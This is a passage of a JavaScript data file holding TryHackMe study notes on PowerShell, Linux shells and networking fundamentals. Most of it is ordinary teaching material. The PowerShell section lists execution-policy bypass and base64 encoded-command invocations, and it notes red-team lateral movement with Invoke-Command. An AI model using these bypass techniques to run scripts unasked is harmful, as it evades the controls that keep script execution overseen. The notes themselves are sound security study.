(unlike Windows CMD which has separate commands: mkdir, rmdir, del, copy, etc.)`,
        commands: [
          'Get-ChildItem',
          'Get-ChildItem -Path C:\\Users',
          'Set-Location -Path ".\\Documents"',
          'New-Item -Path ".\\myfolder" -ItemType "Directory"',
          'New-Item -Path ".\\myfile.txt" -ItemType "File"',
          'Remove-Item -Path ".\\oldfile.txt"',
          'Copy-Item -Path .\\source.txt -Destination .\\dest.txt',
          'Move-Item -Path .\\file.txt -Destination .\\OtherFolder\\',
          'Get-Content -Path ".\\readme.txt"',
        ],
        answer: "Get-Content",
      },
      {
        num: 4,
        title: "Piping, Filtering, and Sorting",
        notes: `PIPING IN POWERSHELL:
→ The | symbol passes OBJECTS (not just text) between cmdlets
→ Objects retain all their properties and methods through the pipe

KEY FILTERING/SORTING CMDLETS:

Sort-Object → sort objects by specified properties
  Get-ChildItem | Sort-Object Length               → sort files by size

Where-Object → filter objects based on conditions
  Get-ChildItem | Where-Object -Property "Extension" -eq ".txt"
  Get-ChildItem | Where-Object -Property Length -gt 100

COMPARISON OPERATORS:
  -eq    → equal to
  -ne    → not equal to
  -gt    → greater than (strict)
  -ge    → greater than or equal to
  -lt    → less than (strict)
  -le    → less than or equal to
  -like  → match with wildcard pattern (e.g. "ship*")

Select-Object → select specific properties or limit results
  Get-ChildItem | Select-Object Name,Length        → show only Name and Length
  Get-ChildItem | Select-Object -First 5           → first 5 results

Select-String → search for text patterns in files (like grep)
  Select-String -Path ".\\file.txt" -Pattern "password"
  Select-String -Path ".\\*.log" -Pattern "error"
  Select-String supports full REGEX patterns

BUILDING PIPELINES:
  Get-ChildItem | Where-Object -Property Extension -eq ".txt" | Sort-Object Length`,
        commands: [
          'Get-ChildItem | Sort-Object Length',
          'Get-ChildItem | Where-Object -Property Extension -eq ".txt"',
          'Get-ChildItem | Where-Object -Property Length -gt 100',
          'Get-ChildItem | Where-Object -Property Name -like "ship*"',
          'Get-ChildItem | Select-Object Name,Length',
          'Select-String -Path ".\\log.txt" -Pattern "error"',
          'Select-String -Path ".\\*.log" -Pattern "192\\.168\\." ',
          '// Combined pipeline:',
          'Get-ChildItem | Where-Object Length -gt 1000 | Sort-Object Length | Select-Object -Last 1',
        ],
        answer: null,
      },
      {
        num: 5,
        title: "System and Network Information",
        notes: `SYSTEM INFORMATION:
  Get-ComputerInfo      → comprehensive system info (OS, hardware, BIOS)
    → Much more detailed than cmd's systeminfo

  Get-LocalUser         → list all local user accounts
    → Shows: Name, Enabled status, Description

NETWORK INFORMATION:
  Get-NetIPConfiguration → network interfaces, IP addresses, DNS, gateways
    → Similar to ipconfig
    → Shows: InterfaceAlias, IPv4Address, IPv4DefaultGateway, DNSServer

  Get-NetIPAddress       → ALL IP addresses on ALL interfaces (including inactive)
    → Shows IPv4 and IPv6 addresses
    → Includes loopback (127.0.0.1 and ::1)

COMPARING TO CMD EQUIVALENTS:
  ipconfig → Get-NetIPConfiguration or Get-NetIPAddress
  systeminfo → Get-ComputerInfo

SECURITY USE CASES:
  Get-LocalUser | Where-Object Enabled -eq $true    → find enabled accounts
  Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address, DNSServer`,
        commands: [
          'Get-ComputerInfo',
          'Get-LocalUser',
          'Get-LocalUser | Where-Object Enabled -eq $true',
          'Get-NetIPConfiguration',
          'Get-NetIPAddress',
          'Get-NetIPAddress | Where-Object AddressFamily -eq "IPv4"',
        ],
        answer: null,
      },
      {
        num: 6,
        title: "Real-Time System Analysis",
        notes: `PROCESS ANALYSIS:
  Get-Process (alias: ps)
  → All running processes with CPU, memory usage, PID
  → Columns: Handles, NPM, PM, WS, CPU, Id, ProcessName

  Get-Process | Where-Object CPU -gt 10    → processes using >10% CPU
  Get-Process | Sort-Object CPU -Descending | Select-Object -First 10

SERVICE ANALYSIS:
  Get-Service
  → Status (Running/Stopped/Paused), Name, DisplayName
  → Used by admins AND incident responders (find anomalous services)

  Get-Service | Where-Object Status -eq "Running"
  Get-Service | Where-Object DisplayName -like "*p1r4t3*"

NETWORK CONNECTION ANALYSIS:
  Get-NetTCPConnection
  → Active TCP connections: LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess
  → Essential for finding backdoors and C2 connections

  Get-NetTCPConnection | Where-Object State -eq "Established"
  Get-NetTCPConnection | Where-Object RemotePort -eq 443

FILE HASHING (integrity checking):
  Get-FileHash -Path ".\\file.txt"              → SHA256 hash (default)
  Get-FileHash -Path ".\\file.txt" -Algorithm MD5
  Get-FileHash -Path ".\\file.exe" -Algorithm SHA1

ALTERNATE DATA STREAMS:
  Get-Item -Path "C:\\file.txt" -Stream *        → view ALL streams on a file
  → $DATA = normal file content stream
  → Any other named stream = ADS (potential malware hiding spot)`,
        commands: [
          'Get-Process',
          'Get-Process | Sort-Object CPU -Descending | Select-Object -First 10',
          'Get-Service',
          'Get-Service | Where-Object Status -eq "Running"',
          'Get-NetTCPConnection',
          'Get-NetTCPConnection | Where-Object State -eq "Established"',
          'Get-FileHash -Path ".\\suspicious.exe"',
          'Get-FileHash -Path ".\\suspicious.exe" -Algorithm MD5',
          'Get-Item -Path "C:\\House\\house_log.txt" -Stream *',
        ],
        answer: "OwningProcess",
      },
      {
        num: 7,
        title: "Scripting and Invoke-Command",
        notes: `INVOKE-COMMAND — Remote Execution:
  → Execute commands on remote systems
  → Essential for system admins and penetration testers

SYNTAX:
  Invoke-Command -FilePath c:\\scripts\\test.ps1 -ComputerName Server01
  Invoke-Command -ComputerName Server01 -Credential Domain01\\User01 -ScriptBlock { Get-Culture }
  Invoke-Command -ComputerName RoyalFortune -ScriptBlock { Get-Service }

SECURITY RELEVANCE:
  Blue Team → automate log analysis, detect anomalies, extract IOCs
  Red Team  → remote command execution, lateral movement, obfuscated payloads
  Admins    → automate tasks across multiple machines simultaneously

EXECUTION POLICY (controls which scripts can run):
  Get-ExecutionPolicy                       → check current policy
  Set-ExecutionPolicy RemoteSigned         → allow local scripts + signed remote scripts
  Set-ExecutionPolicy Bypass -Scope Process → bypass for current session only

COMMON SECURITY BYPASS:
  powershell.exe -ExecutionPolicy Bypass -File script.ps1
  powershell.exe -EncodedCommand <base64>

SCRIPT STRUCTURE (.ps1 files):
  → Variables: $name = "value"
  → Loops: foreach ($item in $collection) { ... }
  → Conditions: if ($x -eq "y") { ... } else { ... }
  → Functions: function Get-Something { ... }`,
        commands: [
          'Invoke-Command -ComputerName Server01 -ScriptBlock { Get-Service }',
          'Invoke-Command -FilePath C:\\scripts\\audit.ps1 -ComputerName Server01',
          'Invoke-Command -ComputerName RoyalFortune -ScriptBlock { Get-Service }',
          'Get-ExecutionPolicy',
          'Set-ExecutionPolicy RemoteSigned',
          '// Bypass for single script run:',
          'powershell.exe -ExecutionPolicy Bypass -File script.ps1',
        ],
        answer: "Invoke-Command -ComputerName RoyalFortune -ScriptBlock { Get-Service }",
      },
    ],
    tools: ["PowerShell", "Get-Process", "Get-Service", "Get-NetTCPConnection", "Get-FileHash", "Invoke-Command"],
    mitre: [
      "T1059.001 — Command and Scripting Interpreter: PowerShell",
      "T1021.006 — Remote Services: Windows Remote Management (WinRM/Invoke-Command)",
      "T1105 — Ingress Tool Transfer",
    ],
    personalNotes:
      "Get-NetTCPConnection is the PowerShell equivalent of netstat — critical for incident response. Get-FileHash for malware verification. Invoke-Command for lateral movement. The pipeline with Where-Object, Sort-Object, Select-Object is the PowerShell trinity — master these three.",
  },

  // ─────────────────────────────────────────────────────────
  {
    id: "linux-shells",
    title: "Linux Shells",
    platform: "TryHackMe",
    category: "Linux",
    difficulty: "Easy",
    icon: "🐚",
    completed: true,
    tags: ["Bash", "Zsh", "Fish", "Shell Scripting", "Shebang", "Variables", "Loops", "Conditionals"],
    overview:
      "Learn about Linux shells and shell scripting. Covers different shell types (Bash, Fish, Zsh), basic shell interaction, types and features comparison, and shell scripting fundamentals including variables, loops, conditional statements, and comments.",
    keyLearnings: [
      "Shell = facilitator between user and OS — interprets commands and passes to OS kernel",
      "Bash = default shell in most Linux distros; widely used with scripting capabilities",
      "Fish = most user-friendly; built-in syntax highlighting and auto spell correction",
      "Zsh = advanced tab completion; customizable via oh-my-zsh; no built-in syntax highlighting",
      "echo $SHELL shows current shell | cat /etc/shells shows all available shells",
      "chsh -s /usr/bin/zsh permanently changes default shell",
      "history command displays all previously executed commands in current session",
      "Shebang = #!/bin/bash at top of script — defines the interpreter",
      "chmod +x script.sh gives executable permission to a script",
      "Variables: $name stores value | read name takes user input",
    ],
    tasks: [
      {
        num: 1,
        title: "How to Interact with a Shell",
        notes: `SHELL — DEFINITION:
The shell is the facilitator between the user and the OS. It interprets the commands you type and passes them to the operating system kernel to execute.

ANALOGY:
  GUI = ordering food from a menu (waiter serves it)
  CLI = going into the kitchen (OS) and cooking yourself
  Shell = the recipe book that helps you cook (gives suggestions)

WHY USE CLI/SHELL?
  → More power and control over the OS
  → Faster for experienced users
  → Automation via scripts
  → Remote management via SSH

KEY COMMANDS:
  pwd     → Print Working Directory (where am I?)
  cd      → Change Directory
  ls      → List contents of a directory
  cat     → Display contents of a file
  grep    → Search for a pattern inside a file

MOST LINUX DISTROS USE BASH AS DEFAULT SHELL.`,
        commands: [
          'pwd                         // show current directory',
          'cd Desktop                  // change to Desktop',
          'ls                          // list contents',
          'cat filename.txt            // show file contents',
          'grep THM dictionary.txt     // search for "THM" in file',
        ],
        answer: "Shell",
      },
      {
        num: 2,
        title: "Types of Linux Shells",
        notes: `CHECK CURRENT SHELL:
  echo $SHELL              → shows path to current shell (e.g. /bin/bash)
  cat /etc/shells          → lists ALL available shells installed on system

SWITCH SHELLS (temporary):
  zsh                      → switch to zsh for current session
  bash                     → switch back to bash

CHANGE DEFAULT SHELL (permanent):
  chsh -s /usr/bin/zsh     → changes default shell permanently

─── BASH (Bourne Again Shell) ─── DEFAULT
  • Widely used, extensive documentation
  • Tab completion (basic)
  • Command history (up/down arrow keys)
  • history command → shows all previous commands
  • Scripting: widely compatible
  • Syntax highlighting: NOT available
  • Auto spell correction: NOT available
  • Customization: basic

─── FISH (Friendly Interactive Shell) ───
  • Most USER-FRIENDLY shell
  • Simple syntax — great for beginners
  • Auto spell CORRECTION for commands
  • Syntax highlighting: BUILT-IN (different colors for different parts)
  • Tab completion: advanced (suggests based on previous commands)
  • Scripting: LIMITED compared to Bash/Zsh
  • Customization: good (interactive tools)

─── ZSH (Z Shell) ───
  • Modern shell combining features of Bash, Ksh, Tcsh
  • Advanced tab completion (extensible with plugins)
  • Auto spell CORRECTION for commands
  • Syntax highlighting: via PLUGINS (not built-in)
  • Tab completion: advanced, extensible with plugins
  • Customization: EXTENSIVE (oh-my-zsh framework)
  • Scripting: excellent (combines traditional Bash with extra features)

FEATURE COMPARISON:
  Syntax highlighting (built-in) → FISH only
  Auto spell correction → Fish and Zsh (NOT Bash)
  Most user-friendly → Fish`,
        commands: [
          'echo $SHELL',
          'cat /etc/shells',
          'bash',
          'zsh',
          'fish',
          'chsh -s /usr/bin/zsh',
          'history',
        ],
        answer: null,
      },
      {
        num: 3,
        title: "Shell Scripting Fundamentals",
        notes: `CREATING A SHELL SCRIPT:
  1. Create a .sh file: nano first_script.sh
  2. Add shebang at top: #!/bin/bash
  3. Write your commands
  4. Save the file
  5. Give executable permission: chmod +x first_script.sh
  6. Run: ./first_script.sh

SHEBANG:
  #!/bin/bash  → tells OS to use bash as interpreter
  #!/usr/bin/env python3  → for Python scripts
  #!/bin/sh    → generic POSIX shell

WHY ./  BEFORE SCRIPT NAME?
  → ./ tells shell to look in CURRENT directory
  → Without ./, shell searches only in PATH environment variable
  → The current directory is NOT in PATH by default (security measure)

─── VARIABLES ───
  name="John"              → assign value
  echo $name              → use variable
  read name               → read input from user into variable
  echo "Welcome, $name"   → use in string

─── LOOPS ───
  for i in {1..10}; do    → iterate 1 to 10
    echo $i               → execute per iteration
  done                    → end of loop

─── CONDITIONAL STATEMENTS ───
  if [ "$name" = "John" ]; then
    echo "Welcome, John!"
  else
    echo "Access denied."
  fi                      → end of conditional (fi = if backwards)

─── COMMENTS ───
  # This is a comment     → starts with #
  Comments don't affect script execution
  Good scripts always have comments in major/complex sections`,
        commands: [
          '#!/bin/bash',
          '// Variable example:',
          'echo "What is your name?"',
          'read name',
          'echo "Welcome, $name"',
          '// Loop example:',
          'for i in {1..10}; do',
          '  echo $i',
          'done',
          '// Conditional example:',
          'if [ "$name" = "John" ]; then',
          '  echo "Access granted"',
          'else',
          '  echo "Access denied"',
          'fi',
          '// Give executable permission:',
          'chmod +x script.sh',
          '// Run script:',
          './script.sh',
        ],
        answer: null,
      },
    ],
    tools: ["Bash", "Zsh", "Fish", "nano", "chmod"],
    mitre: [
      "T1059.004 — Command and Scripting Interpreter: Unix Shell",
      "T1053.003 — Scheduled Task/Job: Cron",
    ],
    personalNotes:
      "Fish has built-in syntax highlighting — this is a common exam/quiz question. Bash has NO built-in syntax highlighting or auto spell correction. Zsh is the 'best of both worlds' but needs plugins for some features. Shebang (#!/bin/bash) is the first line of EVERY bash script.",
  },

  // ═══════════════════════════════════════════════════════
  // NETWORKING
  // ═══════════════════════════════════════════════════════

  {
    id: "networking-concepts",
    title: "Networking Concepts",
    platform: "TryHackMe",
    category: "Networking",
    difficulty: "Easy",
    icon: "🌐",
    completed: true,
    tags: ["OSI Model", "TCP/IP", "IP Addresses", "Subnets", "TCP", "UDP", "Encapsulation", "Telnet"],
    overview:
      "Introduction to fundamental networking concepts. Covers the ISO OSI model (7 layers), TCP/IP model, IP addresses and subnets (private vs public), routing, TCP and UDP transport protocols, and the concept of encapsulation. Hands-on with Telnet to communicate directly with web, echo, and daytime servers.",
    keyLearnings: [
      "OSI mnemonic: 'Please Do Not Throw Spinach Pizza Away' (Physical→Application)",
      "Layer 7 Application, Layer 6 Presentation, Layer 5 Session, Layer 4 Transport, Layer 3 Network, Layer 2 Data Link, Layer 1 Physical",
      "TCP/IP collapses OSI layers 5/6/7 into Application layer; has 4 layers total",
      "Private IP ranges: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16",
      "IPv4 = 32 bits = max ~4 billion addresses",
      "TCP = connection-oriented, reliable, three-way handshake (SYN → SYN-ACK → ACK)",
      "UDP = connectionless, no delivery confirmation, faster than TCP",
      "Port numbers use 2 bytes → range 1 to 65535 (port 0 reserved)",
      "Encapsulation: App data → TCP segment → IP packet → Ethernet/WiFi frame",
      "telnet MACHINE_IP 80 + 'GET / HTTP/1.1' = raw HTTP request",
    ],
    tasks: [
      {
        num: 1,
        title: "OSI Model — 7 Layers",
        notes: `THE OSI MODEL (Open Systems Interconnection):
Conceptual framework developed by ISO that describes how network communications should work.
Not a real implementation — it's a THEORETICAL MODEL used for understanding.

MNEMONIC (bottom to top): "Please Do Not Throw Spinach Pizza Away"

LAYERS (bottom to top):

LAYER 1 — PHYSICAL:
  → Physical connection between devices
  → Medium: wire, fiber, radio
  → Data transmission: electrical, optical, wireless signals
  → Examples: Ethernet cables, fiber optic cables, WiFi radio bands (2.4GHz, 5GHz, 6GHz)

LAYER 2 — DATA LINK:
  → Protocol for data transfer between nodes on the SAME network segment
  → Deals with MAC addresses (6 bytes, expressed in hex)
  → Examples: Ethernet (802.3), WiFi (802.11)
  → MAC address: 3 leftmost bytes = vendor, 3 rightmost = unique identifier
  → Every Ethernet/WiFi frame has source and destination MAC addresses

LAYER 3 — NETWORK:
  → Logical addressing and ROUTING between different networks
  → Deals with IP addresses
  → Examples: IP, ICMP, IPSec, VPNs (SSL/TLS VPN, IPSec)

LAYER 4 — TRANSPORT:
  → End-to-end communication between running applications
  → Flow control, segmentation, error correction
  → Examples: TCP, UDP
  → Identifies processes using PORT NUMBERS (1-65535)

LAYER 5 — SESSION:
  → Establishing, maintaining, and synchronising communication between applications
  → Examples: NFS, RPC

LAYER 6 — PRESENTATION:
  → Data encoding, compression, and encryption
  → Examples: ASCII, Unicode, JPEG, PNG, MIME, MPEG

LAYER 7 — APPLICATION:
  → Network services directly to end-user applications
  → Examples: HTTP, FTP, DNS, POP3, SMTP, IMAP

IMPORTANT NUMBERS:
  Layer 7 → Application  | Layer 4 → Transport (TCP/UDP)
  Layer 3 → Network (IP) | Layer 2 → Data Link (MAC)`,
        commands: [],
        answer: null,
      },
      {
        num: 2,
        title: "TCP/IP Model",
        notes: `TCP/IP MODEL vs OSI MODEL:

TCP/IP has 4 layers (or 5 if Physical is included):

  TCP/IP Layer         OSI Equivalent           Examples
  Application Layer  → OSI Layers 5, 6, 7    → HTTP, HTTPS, FTP, SSH, DNS, SMTP, IMAP, POP3
  Transport Layer    → OSI Layer 4            → TCP, UDP
  Internet Layer     → OSI Layer 3            → IP, ICMP, IPSec
  Link Layer         → OSI Layer 2            → Ethernet 802.3, WiFi 802.11
  (Physical Layer)   → OSI Layer 1            → (sometimes included as 5th layer)

KEY DIFFERENCES:
  → OSI = theoretical framework | TCP/IP = implemented/practical model
  → TCP/IP was developed in 1970s by DoD
  → DoD wanted a network that could SURVIVE partial destruction (military use)
  → Routing protocols were designed to ADAPT if parts of network go offline

HTTP belongs to: Application Layer (both models)
OSI Application Layer covers: 3 OSI layers (5, 6, 7) in TCP/IP model`,
        commands: [],
        answer: null,
      },
      {
        num: 3,
        title: "IP Addresses and Subnets",
        notes: `IPv4 ADDRESS:
  → 4 octets (32 bits total)
  → Each octet: decimal number 0-255
  → Example: 192.168.0.1
  → Max unique addresses: ~4 billion (2^32)

SUBNET MASK:
  → 255.255.255.0 = /24 → first 24 bits don't change across the subnet
  → Means IP range: 192.168.66.1 to 192.168.66.254
  → .0 = network address (reserved) | .255 = broadcast address (reserved)

CHECKING YOUR IP:
  Windows: ipconfig
  Linux: ifconfig  OR  ip address show  (ip a s)
  Output shows: IP address, subnet mask, broadcast address, MAC address

PRIVATE IP RANGES (RFC 1918):
  10.0.0.0    – 10.255.255.255   (10/8)       → Class A
  172.16.0.0  – 172.31.255.255   (172.16/12)  → Class B
  192.168.0.0 – 192.168.255.255  (192.168/16) → Class C

PUBLIC vs PRIVATE:
  Private → cannot reach/be reached from internet directly
  Public  → globally routable; your ISP assigns you one
  NAT     → router translates private IPs to public IP for internet access

ROUTING:
  Router = like a post office; forwards packets toward destination
  Each router inspects IP address and forwards via best path
  Packet often passes through MULTIPLE routers before reaching destination`,
        commands: [
          '// Linux - check IP:',
          'ip a s',
          'ifconfig',
          '// Windows - check IP:',
          'ipconfig',
          'ipconfig /all',
        ],
        answer: null,
      },
      {
        num: 4,
        title: "UDP and TCP",
        notes: `UDP (User Datagram Protocol) — Layer 4:
  → CONNECTIONLESS — no connection establishment needed
  → No delivery confirmation — "fire and forget"
  → Faster than TCP (less overhead)
  → Used for: DNS, DHCP, NTP, SNMP, VoIP, live streaming, gaming
  → Like standard mail with no delivery confirmation

TCP (Transmission Control Protocol) — Layer 4:
  → CONNECTION-ORIENTED — must establish connection first
  → Reliable — acknowledges received data
  → Each data octet has a SEQUENCE NUMBER
  → Receiver sends ACKNOWLEDGEMENT NUMBERS
  → Used for: HTTP/HTTPS, FTP, SSH, email protocols

THREE-WAY HANDSHAKE (TCP connection setup):
  Step 1: Client → Server: SYN packet (with client's initial sequence number)
  Step 2: Server → Client: SYN-ACK packet (with server's initial sequence number)
  Step 3: Client → Server: ACK packet (completing the handshake)

PORT NUMBERS:
  → Identifies the specific PROCESS on a host
  → 2 bytes → range 1 to 65535 (~65,000 ports)
  → Port 0 is reserved
  → Well-known ports: 1-1023 (common services)
  → Registered ports: 1024-49151
  → Dynamic/private ports: 49152-65535

COMMON PORT NUMBERS:
  22=SSH | 80=HTTP | 443=HTTPS | 53=DNS | 21=FTP | 25=SMTP | 110=POP3 | 143=IMAP`,
        commands: [],
        answer: "TCP",
      },
      {
        num: 5,
        title: "Encapsulation",
        notes: `ENCAPSULATION — DEFINITION:
Every layer adds a HEADER (and sometimes a TRAILER) to the data unit from the layer above.

ENCAPSULATION PROCESS (top-down):
  1. Application Data  → user sends message (e.g. HTTP request)
  2. TCP Segment       → Transport layer adds TCP header (ports, sequence numbers)
  3. IP Packet         → Network layer adds IP header (source/dest IP addresses)
  4. Ethernet Frame    → Data Link layer adds frame header (MAC addresses) + trailer (FCS)
  5. Bits              → Physical layer converts frame to electrical/optical/wireless signal

ON RECEIPT — DECAPSULATION (reverse process):
  Each layer REMOVES its header and passes the data unit up to the next layer.

DATA UNIT NAMES:
  Application layer  → Data
  Transport layer    → Segment (TCP) or Datagram (UDP)
  Network layer      → Packet
  Data Link layer    → Frame (Ethernet or WiFi)
  Physical layer     → Bits

ON WIFI: IP packet is encapsulated within a WiFi Frame
TCP data unit = Segment
UDP data unit = Datagram`,
        commands: [],
        answer: null,
      },
      {
        num: 6,
        title: "Telnet — Talking Directly to Servers",
        notes: `TELNET PROTOCOL:
  → Network protocol for remote terminal connection
  → NOT secure (sends everything in PLAINTEXT)
  → Used in CTFs and labs to test/interact with services directly

SYNTAX: telnet MACHINE_IP PORT_NUMBER

USEFUL SERVICES TO TEST WITH TELNET:
  Port 7  → Echo server (echoes everything you send)
  Port 13 → Daytime server (returns current date/time, then closes)
  Port 80 → HTTP server (requires manual HTTP commands)

MAKING AN HTTP REQUEST VIA TELNET:
  telnet MACHINE_IP 80
  GET / HTTP/1.1
  Host: anything.com
  [press Enter twice — blank line signals end of headers]

EXAMPLE HTTP RESPONSE HEADERS:
  HTTP/1.1 200 OK
  Content-Type: text/html
  Server: lighttpd/1.4.63
  [...]

TO CLOSE TELNET CONNECTION:
  Ctrl + ]  → enter telnet command mode
  quit      → close the connection`,
        commands: [
          'telnet MACHINE_IP 7        // echo server',
          'telnet MACHINE_IP 13       // daytime server',
          'telnet MACHINE_IP 80       // HTTP server',
          '// After connecting to port 80:',
          'GET / HTTP/1.1',
          'Host: telnet.thm',
          '// [press Enter twice]',
        ],
        answer: "THM{TELNET_MASTER}",
      },
    ],
    tools: ["telnet", "ip", "ifconfig", "ipconfig"],
    mitre: [
      "T1040 — Network Sniffing",
      "T1046 — Network Service Discovery",
    ],
    personalNotes:
      "OSI layer numbers are CONSTANTLY tested — memorize: 1=Physical, 2=DataLink, 3=Network, 4=Transport, 7=Application. TCP three-way handshake = SYN/SYN-ACK/ACK. UDP has ~65K ports but no handshake. Private IP ranges by heart: 10.x.x.x, 172.16-31.x.x, 192.168.x.x.",
  },

  // ─────────────────────────────────────────────────────────
  {
    id: "networking-essentials",
    title: "Networking Essentials",
    platform: "TryHackMe",
    category: "Networking",
    difficulty: "Easy",
    icon: "🌐",
    completed: true,
    tags: ["DHCP", "ARP", "NAT", "ICMP", "Ping", "Traceroute", "Routing Protocols"],
    overview:
      "Explore the protocols that glue networking together: DHCP (automatic IP configuration), ARP (Layer 3 to Layer 2 translation), ICMP (diagnostics via ping and traceroute), NAT (sharing one public IP across many private IPs), and routing protocols (OSPF, EIGRP, BGP, RIP).",
    keyLearnings: [
      "DHCP = Dynamic Host Configuration Protocol — automatic network config via DORA process",
      "DORA: Discover → Offer → Request → Acknowledge (4 steps)",
      "DHCP server listens on UDP port 67 | client sends from UDP port 68",
      "DHCP Discover sent from 0.0.0.0 to 255.255.255.255 (broadcast)",
      "ARP resolves IP addresses to MAC addresses on the same Ethernet/WiFi segment",
      "ARP Request sent to broadcast MAC ff:ff:ff:ff:ff:ff",
      "ping uses ICMP Echo Request (Type 8) and Echo Reply (Type 0)",
      "traceroute uses TTL — when TTL=0, router sends ICMP Time Exceeded (Type 11)",
      "NAT allows many private IPs to share one public IP — uses translation table",
      "NAT can support ~65,000 simultaneous TCP connections per public IP",
      "EIGRP = Cisco proprietary routing protocol",
    ],
    tasks: [
      {
        num: 1,
        title: "DHCP — Dynamic Host Configuration",
        notes: `WHAT DHCP PROVIDES:
When you connect to any network, you need at minimum:
  1. IP address + subnet mask
  2. Default gateway (router)
  3. DNS server address

WITHOUT DHCP: Must manually configure every device → error-prone, time-consuming
WITH DHCP: Automatic configuration → no IP conflicts, works for mobile devices

DORA PROCESS (4 steps):
  1. DHCP DISCOVER:
     → Client broadcasts DHCPDISCOVER to find a DHCP server
     → From: 0.0.0.0 (client has no IP yet)
     → To: 255.255.255.255 (broadcast)
     → Link layer: from client MAC to broadcast MAC ff:ff:ff:ff:ff:ff

  2. DHCP OFFER:
     → Server responds with DHCPOFFER including an available IP address
     → Uses client's destination MAC address

  3. DHCP REQUEST:
     → Client accepts the offered IP with DHCPREQUEST
     → Still from 0.0.0.0 to 255.255.255.255 (hasn't used new IP yet)

  4. DHCP ACKNOWLEDGE:
     → Server confirms with DHCPACK
     → Client now has: IP, subnet mask, gateway, DNS server, lease duration

TECHNICAL DETAILS:
  DHCP uses UDP
  Server listens: UDP port 67
  Client sends from: UDP port 68
  DHCP is application-layer protocol (Layer 7)`,
        commands: [
          '// Capture DHCP traffic with tcpdump:',
          'tcpdump -i eth0 port 67 or port 68 -n',
          '// Renew DHCP lease on Linux:',
          'dhclient -r && dhclient',
          '// Windows:',
          'ipconfig /release',
          'ipconfig /renew',
        ],
        answer: null,
      },
      {
        num: 2,
        title: "ARP — Address Resolution Protocol",
        notes: `WHY ARP IS NEEDED:
  → Two devices on same Ethernet CANNOT communicate without knowing each other's MAC addresses
  → Devices always know IP addresses (from DHCP/config) but not MAC addresses initially
  → ARP bridges Layer 3 (IP) to Layer 2 (MAC)

ARP PROCESS:
  ARP REQUEST:
  → Sent from: requester's MAC address
  → Sent to: BROADCAST MAC address (ff:ff:ff:ff:ff:ff)
  → Message: "Who has IP 192.168.66.1? Tell 192.168.66.89"
  → All devices on the segment receive this

  ARP REPLY:
  → Sent from: target device's MAC address
  → Sent to: requester's MAC address (unicast, not broadcast)
  → Message: "192.168.66.1 is at 44:df:65:d8:fe:6c"

AFTER ARP:
  → Both devices now know each other's MAC addresses
  → MAC addresses cached in ARP table to avoid repeated lookups
  → Check ARP table: arp -a (Windows/Linux)

IMPORTANT TECHNICAL DETAIL:
  → ARP is encapsulated DIRECTLY in an Ethernet frame (no IP or UDP wrapper)
  → ARP operates at Layer 2 (some argue Layer 2.5 since it supports IP)

SECURITY NOTE:
  → ARP has NO authentication → ARP Poisoning/Spoofing attacks possible
  → Attacker sends fake ARP replies to poison ARP caches → Man-in-the-Middle`,
        commands: [
          '// View ARP cache:',
          'arp -a',
          '// Clear ARP cache (Linux):',
          'ip neigh flush all',
          '// Clear ARP cache (Windows):',
          'arp -d *',
          '// Capture ARP traffic:',
          'tcpdump -i eth0 arp -n',
        ],
        answer: null,
      },
      {
        num: 3,
        title: "ICMP — ping and traceroute",
        notes: `ICMP (Internet Control Message Protocol) — Layer 3:
Used primarily for network DIAGNOSTICS and ERROR REPORTING.

─── PING ───
Command: ping <target>
Purpose: Test connectivity and measure round-trip time (RTT)

HOW IT WORKS:
  → Sends ICMP Echo Request (Type 8) to target
  → Target responds with ICMP Echo Reply (Type 0)
  → If no reply: target offline OR firewall blocking ICMP

PING OUTPUT INCLUDES:
  → IP address of target
  → Bytes sent (default: 32 bytes Windows, 56 bytes Linux)
  → TTL value in reply
  → Round-trip time (RTT) in milliseconds
  → Packet loss statistics
  → Min/Avg/Max/StdDev RTT

OPTIONS:
  ping -c 4 target     → Linux: stop after 4 packets
  ping -n 4 target     → Windows: stop after 4 packets
  ping -t target       → Windows: continuous ping

─── TRACEROUTE ───
Linux: traceroute | Windows: tracert
Purpose: Discover the route (path) from your host to a target

HOW IT WORKS:
  → Sends packets with increasing TTL values (starting at 1)
  → Each router decrements TTL by 1 before forwarding
  → When TTL reaches 0, router DROPS packet and sends ICMP Time Exceeded (Type 11)
  → This reveals each router's IP along the path
  → Eventually reaches target which responds

READING TRACEROUTE OUTPUT:
  → Each line = one hop (one router)
  → Three time values = three probes to same router
  → * * * = router didn't respond (dropped packet silently)
  → Latency increases as you get further from source`,
        commands: [
          '// Linux ping:',
          'ping -c 4 192.168.1.1',
          'ping -c 4 example.com',
          '// Windows ping:',
          'ping -n 4 example.com',
          'ping -t example.com     // continuous',
          '// Linux traceroute:',
          'traceroute example.com',
          '// Windows traceroute:',
          'tracert example.com',
        ],
        answer: "TTL",
      },
      {
        num: 4,
        title: "Routing Protocols",
        notes: `ROUTING — WHY IT'S NEEDED:
  → The internet is millions of routers and billions of devices
  → Each router must know which way to forward packets
  → Routing algorithms determine the best path

ROUTING PROTOCOLS:

OSPF (Open Shortest Path First):
  → Routers share info about network TOPOLOGY
  → Each router builds a complete map of the network
  → Calculates shortest paths using Dijkstra's algorithm
  → Used in: enterprise LANs and WANs

EIGRP (Enhanced Interior Gateway Routing Protocol):
  → Cisco PROPRIETARY (only works on Cisco devices)
  → Combines aspects of different routing algorithms
  → Considers bandwidth AND delay for route cost
  → Very efficient for Cisco-only networks

BGP (Border Gateway Protocol):
  → PRIMARY routing protocol used on THE INTERNET
  → How different ISPs and networks exchange routing information
  → Routes traffic between AUTONOMOUS SYSTEMS
  → Very complex; critical to global internet functionality

RIP (Routing Information Protocol):
  → Simple protocol for SMALL NETWORKS
  → Uses hop count as metric (max 15 hops)
  → Routers share routing tables with neighbors
  → Slow convergence; not suitable for large networks

EXAM QUESTION HINT: EIGRP = Cisco proprietary`,
        commands: [
          '// View routing table on Linux:',
          'ip route show',
          'route -n',
          '// View routing table on Windows:',
          'route print',
          'netstat -r',
        ],
        answer: "EIGRP",
      },
      {
        num: 5,
        title: "NAT — Network Address Translation",
        notes: `WHY NAT WAS CREATED:
  → IPv4 supports only ~4 billion addresses
  → Not enough for billions of devices worldwide
  → NAT allows ONE public IP to serve MANY private IP devices

HOW NAT WORKS:
  → Router maintains a TRANSLATION TABLE
  → Maps: internal IP + internal port ↔ external IP + external port
  → Example: 192.168.0.129:15401 ↔ 212.3.4.5:19273

NAT TRANSLATION TABLE EXAMPLE:
  Internal IP     | Internal Port | External IP  | External Port
